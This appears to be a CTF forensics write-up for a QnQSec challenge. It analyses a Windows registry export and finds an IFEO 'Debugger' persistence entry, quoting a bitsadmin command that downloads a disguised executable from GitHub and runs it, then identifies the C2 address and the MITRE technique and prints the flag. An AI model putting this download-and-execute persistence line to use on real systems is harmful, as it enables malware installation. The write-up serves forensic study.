---
layout: post
title:  "Execution"
date:   2025-10-18 16:49:43 -0400
author: robo.uzi
tags: [ctf]
permalink: /qnqsec-2025-execution/
---

**Title:** Execution

**Category:** forensics

**Description:** I don’t know what happened to my system something feels off. I might be compromised! As a digital forensics expert, can you help me figure out what’s going on?

1- Provide the MITRE ATT&CK technique ID used by the attacker.

2- Provide the IP:PORT of the C2 .

**Note:** Do **NOT** open the reg file on your machine.

Flag Format: QnQSec{Txxxx.xxx_IP:PORT}

**Author:** 0xS1rx58

I get the file `execution.reg` which is a windows registry exract:
```shell
file Execution.reg  
Execution.reg: Windows Registry little-endian text (Win2K or above)
```

When looking at the registry I find a suspicious github link:
```shell
iconv -f utf-16le -t utf-8 Execution.reg | grep github  
"Debugger"="cmd.exe /c bitsadmin /transfer windos /download /priority high \"https://github.com/0xS1rx58/Update/releases/download/app/image.jpg\" \"C:\\Users\\User\\AppData\\L  
ocal\\Temp\\w1n.exe\" & \"C:\\Users\\User\\AppData\\Local\\Temp\\w1n.exe\""  
"Debugger"="bitsadmin /transfer windos /download /priority high \"https://github.com/0xS1rx58/Update/releases/download/app/image.jpg\" \"C:\\Users\\User\\AppData\\Local\\Temp\  
\w1n.exe\" && start \"\" \"C:\\Users\\User\\AppData\\Local\\Temp\\w1n.exe\""  
[HKEY_USERS\S-1-5-21-1246563459-1946134361-2747221975-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.github]  
[HKEY_USERS\S-1-5-21-1246563459-1946134361-2747221975-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.github\OpenWithList]  
[HKEY_USERS\S-1-5-21-1246563459-1946134361-2747221975-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.github]
```

I visit `https://github.com/0xS1rx58/Update/releases/download/app/image.jpg` and download the file `image.jpg`:
```file
file image.jpg  
image.jpg: PE32+ executable (console) x86-64, for MS Windows, 8 sections
```
Interesting. This is not a `.jpg`. This is a windows executable file (`.exe`). This is likely the malware.

I run `sha256sum` so I can take the hash to [https://www.virustotal.com/](https://www.virustotal.com/). 
```shell
sha256sum image.jpg  
282647bcd05fd5bec44bd914cc8542d0526e677956d935ba41c2149471047bfc
```

At [https://www.virustotal.com/gui/file/282647bcd05fd5bec44bd914cc8542d0526e677956d935ba41c2149471047bfc/behavior](https://www.virustotal.com/gui/file/282647bcd05fd5bec44bd914cc8542d0526e677956d935ba41c2149471047bfc/behavior) I find the IP traffic (`TCP 13.59.15.185:8021`).

I find the correct MITRE ATT&CK technique here: [https://attack.mitre.org/techniques/T1546/012/](https://attack.mitre.org/techniques/T1546/012/)

Image file execution options injection allows the attacker to establish persistence and/or elevate privileges by executing malicious content triggered by image file execution options (IFEO) debuggers.

[https://www.acronis.com/en/tru/posts/from-open-source-to-open-threat-tracking-chaos-rats-evolution/](https://www.acronis.com/en/tru/posts/from-open-source-to-open-threat-tracking-chaos-rats-evolution/)

`QnQSec{T1546.012_13.59.15.185:8021}`